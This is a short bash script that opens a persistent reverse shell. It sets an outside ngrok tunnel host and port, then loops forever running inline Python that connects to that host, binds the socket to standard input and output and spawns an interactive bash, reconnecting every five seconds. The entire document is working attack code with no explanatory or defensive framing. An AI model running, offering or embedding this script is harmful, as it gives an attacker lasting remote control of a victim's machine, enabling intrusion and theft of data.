#!/bin/bash

export RHOST="0.tcp.in.ngrok.io"
export RPORT=19088

while true; do
    python3 -c '
import sys, socket, os, pty
s = socket.socket()
try:
    s.connect((os.getenv("RHOST"), int(os.getenv("RPORT"))))
except Exception:
    sys.exit(1)
for fd in (0,1,2):
    os.dup2(s.fileno(), fd)
pty.spawn("bash")
'
    echo "[*] Disconnected, retrying in 5 seconds..."
    sleep 5
done